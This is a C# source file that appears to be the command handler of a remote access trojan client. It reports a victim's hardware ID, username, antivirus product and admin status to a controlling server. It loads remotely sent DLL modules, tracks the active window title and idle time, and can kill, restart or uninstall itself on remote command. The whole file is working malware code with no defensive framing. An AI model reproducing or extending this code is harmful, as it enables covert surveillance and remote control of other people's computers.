using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace xenonClient
{
    class Handler
    {
        private Node Main;
        private DllHandler dllhandler;

        // 构造函数初始化主节点和DLL处理器
        public Handler(Node main, DllHandler dllHandler) 
        {
            this.dllhandler = dllHandler;
            this.Main = main;
        }

        // 创建子套接字并根据类型处理接收的数据
        public async Task CreateSubSock(byte[] data)
        {
            try
            {
                int type = data[1];
                int retid = data[2];
                Node sub = await Main.ConnectSubSockAsync(type, retid, OnDisconnect);
                sub.Parent = Main;
                Main.AddSubNode(sub);

                switch (sub.SockType)
                {
                    case 1:
                        await Type1Receive(sub);
                        break;
                    case 2:
                        await Type2Receive(sub);
                        break;
                    default:
                        sub?.Disconnect();
                        break;
                }
            }
            catch 
            {
                Console.WriteLine($"Error with subnode, subnode type={data[1]}");
            }
        }

        // 空的断开连接处理函数
        private void OnDisconnect(Node subNode) 
        { 
            // 断开连接时的处理逻辑
        }

        // 获取并发送客户端信息
        private async Task GetAndSendInfo(Node type0) 
        {
            if (type0.SockType != 0) return;

            string clientVersion = "1.8.7"; // 假设的客户端版本
            string[] info = new string[] 
            {
                Utils.HWID(),
                Environment.UserName,
                WindowsIdentity.GetCurrent().Name,
                clientVersion,
                Utils.GetWindowsVersion(),
                Utils.GetAntivirus(),
                Utils.IsAdmin().ToString()
            };

            byte[] data = info
                .SelectMany((value, index) => Encoding.UTF8.GetBytes(value).Concat(index < info.Length - 1 ? new byte[] { 0 } : new byte[0]))
                .ToArray();

            await type0.SendAsync(data);
        }

        // 处理类型0的接收逻辑
        public async Task Type0Receive()
        {
            while (Main.Connected())
            {
                byte[] data = await Main.ReceiveAsync();
                if (data == null) break;

                int opcode = data[0];
                switch (opcode)
                {
                    case 0:
                        await CreateSubSock(data);
                        break;
                    case 1:
                        await GetAndSendInfo(Main);
                        break;
                    case 2:
                        Process.GetCurrentProcess().Kill();
                        break;
                    case 3:
                        Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
                        Process.GetCurrentProcess().Kill();
                        break;
                    case 4:
                        await Utils.Uninstall();
                        break;
                }
            }
            Main.Disconnect();
        }

        // 处理类型1的接收逻辑
        public async Task Type1Receive(Node subServer)
        {
            byte[] heartbeatReply = new byte[] { 1 };
            byte[] heartbeatFail = new byte[] { 2 };
            subServer.SetRecvTimeout(5000);

            while (subServer.Connected() && Main.Connected())
            {
                await Task.Delay(1000);
                byte[] data = await subServer.ReceiveAsync();
                if (data == null) break;

                int opcode = data[0];
                if (opcode != 0) 
                {
                    await subServer.SendAsync(heartbeatFail);
                    break;
                }
                await subServer.SendAsync(heartbeatReply);
            }
            Main.Disconnect();
            subServer.Disconnect();
        }

        // 设置子服务器的ID
        private async Task SetSetId(Node subServer, byte[] data) 
        {
            byte[] worked = new byte[] { 1 };
            subServer.SetId = subServer.sock.BytesToInt(data, 1);
            await subServer.SendAsync(worked);
        }

        // 处理类型2的接收逻辑
        public async Task Type2Receive(Node subServer)
        {
            while (subServer.Connected() && Main.Connected())
            {
                byte[] data = await subServer.ReceiveAsync();
                if (data == null) break;

                int opcode = data[0];
                switch (opcode)
                {
                    case 0:
                        await SendUpdateInfo(subServer);
                        break;
                    case 1:
                        await dllhandler.DllNodeHandler(subServer);
                        return; // 退出循环
                    case 2:
                        await SetSetId(subServer, data);
                        break;
                    case 3:
                        return; // 退出循环
                    case 4:
                        await DebugMenu(subServer, data);
                        break;
                }
            }
            subServer.Disconnect();
        }

        // 调试菜单处理
        public async Task DebugMenu(Node subServer, byte[] data) 
        {
            int opcode = data[1];
            switch (opcode) 
            {
                case 0:
                    await subServer.SendAsync(Encoding.UTF8.GetBytes(String.Join("\n", dllhandler.Assemblies.Keys)));
                    break;
                case 1:
                    string assemblyName = Encoding.UTF8.GetString(data.Skip(2).ToArray());
                    bool worked = dllhandler.Assemblies.Keys.Contains(assemblyName) && dllhandler.Assemblies.Remove(assemblyName);
                    await subServer.SendAsync(new byte[] { (byte)(worked ? 1 : 0) });
                    break;
                case 2:
                    await subServer.SendAsync(Encoding.UTF8.GetBytes(Program.ProcessLog.ToString()));
                    break;
            }
        }

        // 发送更新信息
        public async Task SendUpdateInfo(Node node) 
        {
            string currentWindow = await Utils.GetCaptionOfActiveWindowAsync();
            string idleTime = (await Utils.GetIdleTimeAsync() / 1000).ToString();
            string updateData = $"{currentWindow}\n{idleTime}";
            byte[] data = Encoding.UTF8.GetBytes(updateData);
            await node.SendAsync(data);
        }
    }
}